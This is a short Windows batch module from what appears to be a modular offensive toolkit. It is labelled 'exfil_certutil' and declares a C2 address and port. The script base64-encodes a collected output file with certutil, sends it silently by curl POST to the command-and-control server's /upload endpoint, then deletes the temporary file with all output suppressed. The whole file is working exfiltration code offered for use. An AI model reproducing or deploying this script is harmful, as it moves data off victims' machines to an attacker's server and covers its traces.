REM provides: exfil_certutil
REM depends: core/output
REM description: Base64-encode output with certutil then exfil via curl

if not defined C2_IP set "C2_IP=10.0.2.2"
if not defined C2_PORT set "C2_PORT=9001"

set "ENCODED_FILE=%TEMP%\enc_%RANDOM%.tmp"
certutil -encode "%OUTPUT_FILE%" "%ENCODED_FILE%" >nul 2>nul

curl -s -X POST -H "Content-Type: text/plain" --data-binary @"%ENCODED_FILE%" "http://%C2_IP%:%C2_PORT%/upload" >nul 2>nul

del /f /q "%ENCODED_FILE%" >nul 2>nul
